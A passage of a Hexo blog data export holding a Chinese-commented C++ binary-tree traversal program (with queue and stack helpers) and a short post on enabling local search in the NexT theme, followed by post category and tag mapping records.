class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> STACK_INIT_SIZE 100<span class=\"comment\">//存储空间初始分配量</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> STACKINCREMENT 10<span class=\"comment\">//存储空间分配增量</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BiTNode</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> data;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">BiTNode</span>* <span class=\"title\">lchild</span>, * <span class=\"title\">rchild</span>;</span></span><br><span class=\"line\">&#125;BiTNode,* BiTree;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tBiTNode* treeNode;</span><br><span class=\"line\">\tNode* next;</span><br><span class=\"line\">&#125;Node;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">LinkQueue</span> &#123;</span></span><br><span class=\"line\">\tNode* front;</span><br><span class=\"line\">\tNode* rear;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;LinkQueue;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\tBiTNode* top;</span><br><span class=\"line\">\tBiTNode* base;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;stack;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">createBiTree</span><span class=\"params\">(BiTree&amp; t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrderTraverse</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse1</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">postOrderTraverse</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getDeep</span><span class=\"params\">(BiTree t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">initQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">enQueue</span><span class=\"params\">(LinkQueue&amp; Q, BiTNode treeNode)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">deQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">floorTraverse</span><span class=\"params\">(LinkQueue&amp; Q, BiTree&amp; t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse2</span><span class=\"params\">(stack s, BiTree&amp; t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initStack</span><span class=\"params\">(stack&amp; s)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">isEmpty</span><span class=\"params\">(stack&amp; s)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(stack&amp; s, BiTNode treeNode)</span></span>;</span><br><span class=\"line\"><span class=\"function\">BiTNode <span class=\"title\">pop</span><span class=\"params\">(stack&amp; s)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\tBiTree t;</span><br><span class=\"line\">\tstack s;</span><br><span class=\"line\">\t<span class=\"built_in\">initStack</span>(s);</span><br><span class=\"line\">\tLinkQueue Q;</span><br><span class=\"line\">\t<span class=\"built_in\">initQueue</span>(Q);</span><br><span class=\"line\">\t<span class=\"built_in\">createBiTree</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;二叉树创建完成&quot;</span> &lt;&lt; endl&lt;&lt;endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;先序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">preOrderTraverse</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;递归中序遍历&quot;</span> &lt;&lt;endl;</span><br><span class=\"line\">\t<span class=\"built_in\">inOrderTraverse1</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;非递归中序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">inOrderTraverse2</span>(s, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;后序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">postOrderTraverse</span>(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;层序遍历&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"built_in\">floorTraverse</span>(Q, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;二叉树的深度为&quot;</span> &lt;&lt; <span class=\"built_in\">getDeep</span>(t) &lt;&lt; endl;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">createBiTree</span><span class=\"params\">(BiTree&amp; t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> c;</span><br><span class=\"line\">\tcin &gt;&gt; c;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (c == <span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">\t\t<span class=\"comment\">//利用给先序遍历序列添加空节点保证建立二叉树的唯一性</span></span><br><span class=\"line\">\t\tt = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!(t = (BiTNode*)<span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BiTNode)))) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//申请该节点的内存空间</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//按照先序序列创建二叉树</span></span><br><span class=\"line\">\t\tt-&gt;data = c;</span><br><span class=\"line\">\t\t<span class=\"built_in\">createBiTree</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"built_in\">createBiTree</span>(t-&gt;rchild);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//先序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrderTraverse</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t) &#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; t-&gt;data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t<span class=\"built_in\">preOrderTraverse</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"built_in\">preOrderTraverse</span>(t-&gt;rchild);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//中序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse1</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">inOrderTraverse1</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\tcout &lt;&lt; t-&gt;data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t<span class=\"built_in\">inOrderTraverse1</span>(t-&gt;rchild);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//后序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">postOrderTraverse</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">postOrderTraverse</span>(t-&gt;lchild);</span><br><span class=\"line\">\t\t<span class=\"built_in\">postOrderTraverse</span>(t-&gt;rchild);</span><br><span class=\"line\">\t\tcout &lt;&lt; t-&gt;data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getDeep</span><span class=\"params\">(BiTree t)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"built_in\">getDeep</span>(t-&gt;lchild);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b = <span class=\"built_in\">getDeep</span>(t-&gt;rchild);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (a &gt; b) ? (a + <span class=\"number\">1</span>) : (b + <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">initQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span> </span>&#123;</span><br><span class=\"line\">\tQ.front = Q.rear = <span class=\"keyword\">new</span> Node;</span><br><span class=\"line\">\t<span class=\"comment\">//这个链队列是具有头结点的链队列,头结点不存数据</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!Q.front) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tQ.front-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">enQueue</span><span class=\"params\">(LinkQueue&amp; Q, BiTNode *treeNode)</span> </span>&#123;</span><br><span class=\"line\">\tNode* p = (Node*)<span class=\"built_in\">malloc</span>(<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(Node));</span><br><span class=\"line\">\t<span class=\"comment\">//如果内存申请失败</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!p) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//让p节点中的treeNode指向对应的树节点</span></span><br><span class=\"line\">\tp-&gt;treeNode =treeNode;</span><br><span class=\"line\">\tp-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//连接链表</span></span><br><span class=\"line\">\tQ.rear-&gt;next = p;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//头结点的data域为空,尾结点data域非空</span></span><br><span class=\"line\">\tQ.rear = p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">deQueue</span><span class=\"params\">(LinkQueue&amp; Q)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Q.front &amp;&amp; Q.front != Q.rear) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//新建一个temp指针p</span></span><br><span class=\"line\">\t\tNode* p = Q.front-&gt;next;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tQ.front-&gt;next = p-&gt;next;</span><br><span class=\"line\">\t\t<span class=\"comment\">//判断出队的是不是最后一个节点</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//如果不加这个判断free(p后),Q.rear-&gt;next会变为野指针</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (p == Q.rear) &#123;</span><br><span class=\"line\">\t\t\tQ.rear = Q.front;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">floorTraverse</span><span class=\"params\">(LinkQueue&amp; Q, BiTree&amp; t)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (t != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">enQueue</span>(Q, t);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (Q.front != Q.rear) &#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; Q.front-&gt;next-&gt;treeNode-&gt;data &lt;&lt;<span class=\"string\">&#x27; &#x27;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Q.front-&gt;next-&gt;treeNode-&gt;lchild != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">enQueue</span>(Q, Q.front-&gt;next-&gt;treeNode-&gt;lchild);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (Q.front-&gt;next-&gt;treeNode-&gt;rchild != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">enQueue</span>(Q, Q.front-&gt;next-&gt;treeNode-&gt;rchild);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">deQueue</span>(Q);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">inOrderTraverse2</span><span class=\"params\">(stack s,BiTree&amp; t)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBiTNode* p = t;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(p || !<span class=\"built_in\">isEmpty</span>(s)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (p) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">push</span>(s, *p);</span><br><span class=\"line\">\t\t\tp = p-&gt;lchild;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tBiTNode e = <span class=\"built_in\">pop</span>(s);</span><br><span class=\"line\">\t\t\tcout &lt;&lt; e.data &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class=\"line\">\t\t\tp = e.rchild;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//栈相关函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initStack</span><span class=\"params\">(stack&amp; s)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//申请内存空间</span></span><br><span class=\"line\">\ts.base = (BiTNode*)<span class=\"built_in\">malloc</span>(STACK_INIT_SIZE * <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BiTNode));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!s.base) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts.top = s.base;</span><br><span class=\"line\">\ts.size = STACK_INIT_SIZE;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">isEmpty</span><span class=\"params\">(stack&amp; s)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (s.base == s.top)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(stack&amp; s, BiTNode treeNode)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (s.top - s.base &gt;= s.size) &#123;</span><br><span class=\"line\">\t\ts.base = (BiTNode*)<span class=\"built_in\">realloc</span>(s.base, (s.size + STACKINCREMENT) * <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BiTNode));</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!s.base) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ts.top = s.base + s.size;</span><br><span class=\"line\">\t\ts.size += STACKINCREMENT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*s.top++ = treeNode;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">BiTNode <span class=\"title\">pop</span><span class=\"params\">(stack&amp; s)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (s.base) &#123;\t</span><br><span class=\"line\">\t\tBiTNode e = (*--s.top);</span><br><span class=\"line\">\t\t(*s.top).data = <span class=\"string\">&#x27;$&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> e;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"hexo的next主题配置搜索功能","date":"2021-12-04T15:39:33.000Z","_content":"\n1.安装插件\n\n`npm install hexo-generator-searchdb --save`\n\n2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true\n\n3.将下列参数添加到hexo的配置文件中(_config.yml)\n\n```\nsearch:\n  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.\n  field: post\n  format: html\n  limit: 10000\n```\n\n然后\n\n```\nhexo clean\nhexo g\nhexo d\n```\n\n即可在线使用搜索功能\n\n#### 注意事项:\n\n安装searchdb插件后\n\n如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框\n\n","source":"_posts/hexo的next主题配置搜索功能.md","raw":"---\ntitle: hexo的next主题配置搜索功能\ndate: 2021-12-04 23:39:33\ntags:\n    -hexo\n    -Next主题搜索功能\ncategories: hexo\n---\n\n1.安装插件\n\n`npm install hexo-generator-searchdb --save`\n\n2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true\n\n3.将下列参数添加到hexo的配置文件中(_config.yml)\n\n```\nsearch:\n  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.\n  field: post\n  format: html\n  limit: 10000\n```\n\n然后\n\n```\nhexo clean\nhexo g\nhexo d\n```\n\n即可在线使用搜索功能\n\n#### 注意事项:\n\n安装searchdb插件后\n\n如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框\n\n","slug":"hexo的next主题配置搜索功能","published":1,"updated":"2021-12-04T15:44:51.047Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrzm9f10000skuy6u9ibffb","content":"<p>1.安装插件</p>\n<p><code>npm install hexo-generator-searchdb --save</code></p>\n<p>2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true</p>\n<p>3.将下列参数添加到hexo的配置文件中(_config.yml)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  limit: 10000</span><br></pre></td></tr></table></figure>\n\n<p>然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n\n<p>即可在线使用搜索功能</p>\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项:\"></a>注意事项:</h4><p>安装searchdb插件后</p>\n<p>如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.安装插件</p>\n<p><code>npm install hexo-generator-searchdb --save</code></p>\n<p>2.修改next主题的_config.yml配置文件,找到local_search,将其中的enable设置为true</p>\n<p>3.将下列参数添加到hexo的配置文件中(_config.yml)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml   #在public目录的根目录下生成search.xml 文件，用于存储网站文章的文字数据.</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  limit: 10000</span><br></pre></td></tr></table></figure>\n\n<p>然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n\n<p>即可在线使用搜索功能</p>\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项:\"></a>注意事项:</h4><p>安装searchdb插件后</p>\n<p>如果不配置第三部的参数,在在线页面中会出现一直转圈的搜索框</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckwrz8yid0001wouy6gf3dxsv","category_id":"ckwrz8yih0004wouy8doee52h","_id":"ckwrz8yim000ewouyd73nfjms"},{"post_id":"ckwrz8yif0003wouy0src1rn4","category_id":"ckwrz8yil000bwouy7ll545cw","_id":"ckwrz8yin000jwouyan96c6y1"},{"post_id":"ckwrz8yij0007wouyg92f7e7r","category_id":"ckwrz8yim000fwouy4r6j5vzk","_id":"ckwrz8yip000nwouy0turgfao"},{"post_id":"ckwrz8yik0009wouy15kb835d","category_id":"ckwrz8yil000bwouy7ll545cw","_id":"ckwrz8yip000pwouyfee09we6"},{"post_id":"ckwrz8yil000awouybi10gopb","category_id":"ckwrz8yip000mwouy50uh5tp2","_id":"ckwrz8yiq000uwouy64ua63ts"},{"post_id":"ckwrz8yim000dwouy8cv7bclk","category_id":"ckwrz8yip000qwouyemyx90c8","_id":"ckwrz8yiq000ywouy7zyb2tot"},{"post_id":"ckwrzm9f10000skuy6u9ibffb","category_id":"ckwrz8yil000bwouy7ll545cw","_id":"ckwrzm9fa0002skuycgr0exrt"}],"PostTag":[{"post_id":"ckwrz8yid0001wouy6gf3dxsv","tag_id":"ckwrz8yii0005wouy7hr9404g","_id":"ckwrz8yin000hwouy6sr0gzbr"},{"post_id":"ckwrz8yid0001wouy6gf3dxsv","tag_id":"ckwrz8yil000cwouy10okczu6","_id":"ckwrz8yin000iwouyhtaj7caj"},{"post_id":"ckwrz8yif0003wouy0src1rn4","tag_id":"ckwrz8yin000gwouyadtd2djy","_id":"ckwrz8yiq000swouy5z0t843v"},{"post_id":"ckwrz8yif0003wouy0src1rn4","tag_id":"ckwrz8yil000cwouy10okczu6","_id":"ckwrz8yiq000twouydhwj404f"},{"post_id":"c